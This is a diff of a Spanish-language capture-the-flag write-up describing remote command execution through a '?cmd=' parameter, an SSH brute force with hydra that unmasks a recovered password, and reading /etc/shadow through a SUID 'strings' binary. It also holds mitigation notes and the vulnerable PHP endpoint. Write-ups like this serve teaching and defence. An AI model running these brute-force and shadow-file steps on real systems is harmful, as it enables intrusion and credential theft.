@@ -74,14 +74,47 @@ Es cuestion de añadir un
 ```
 ?cmd=
 ```
-y ya tenemos un RCE , parece que no puedo obtener una rev shell con los metodos normales,pero listando los directorios en /home encontramos un archivo llamado jack_pass.lst, tiramos de hydra 
+y ya tenemos un RCE , listando los directorios en /home encontramos un archivo llamado jack_pass.lst, tiramos de hydra 
 ```
 hydra -l jack -P jack_pass.lst ssh://10.10.68.189:80/
-[80][ssh] host: 10.10.68.189   login: jack   password: IT*************@
+[80][ssh] host: 10.10.68.189   login: jack   password: ITMJpGGIqg1jn?>@
 ```
-
 Con el siguiente mensaje
 ```
 GET me a 'cmd' and I'll run it for you Future-Jack.
 ```
 ## Privesc
+El bit SUID esta activo en el archivo string, de modo que podemos abusar de el para leer cualquier archivo en la máquina
+```
+/usr/bin/strings /etc/shadow
+```
+Con esto podriamos crackear usando jhon the ripper o hashcat el hash del root para mantener privilegios ,aunque lo intencionado en la máquina es leer la root flag desde aquí
+
+# Analisis de la intrusión
+### Sensible data leak
+La criptografía debil y la esteganografía son debiles y no deberían usarse para exponer credenciales a simple vista
+### RCE 
+Existe un endpoint que permite RCE, lo cual es una mala práctica
+### SUID bit on strings
+El bit SUID esta habilitado en el binario de strings, esto conduce a la posibilidad de leer archivos de manera arbitaria
+
+# Solucion
+### RCE 
+Eliminar el endpoint que permite RCE seria la mejor mitigación posible, pero si no habría que añadir un filtro al input al menos para evitar la obtención de reverse shells
+```
+<?php
+	session_start();
+	if (!isset($_COOKIE["login"])){
+		header("location: ../index.html");
+		exit();
+	}
+	echo "GET me a 'cmd' and I'll run it for you Future-Jack.\n";
+	if($_COOKIE["login"] === "jackinthebox:a78e6e9d6f7b9d0abe0ea866792b7d84"){
+		if (isset($_GET['cmd'])){
+			
+			echo nl2br(system($_GET['cmd']));
+		}
+	}
+```
+### SUID bit on strings
+Deshabilitar el SUID de ese binario sería una gran idea
